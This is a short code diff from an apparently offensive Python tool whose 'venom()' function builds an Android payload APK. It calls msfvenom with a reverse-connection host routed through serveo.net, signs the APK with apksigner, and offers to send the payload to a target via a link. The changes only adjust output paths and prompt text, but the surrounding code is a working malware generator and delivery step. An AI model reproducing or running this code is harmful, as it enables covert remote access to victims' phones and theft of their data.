@@ -92,14 +92,14 @@ def venom():
 	        ip=socket.gethostbyname(socket.gethostname())
 	        port=lport	
 	        serv=socket.gethostbyname("serveo.net")
-	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
+	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name} ")
 	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {output}/{name}")
 	        print("SIGNING YOUR APK>>>>>>...")
 	        print("")
-	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {path}/{name}")
+	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
 	        print("")
-	        print(f"{path}/{name}.apk  has been created successfully .......")
-	        link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK? (kali linux only) [Y/n] : ")
+	        print(f"{output}/{name} has been created successfully .......")
+	        link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK?[Y/n] : ")
 	        if link=="y" or link=="Y":
 		             print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
 		             print("")
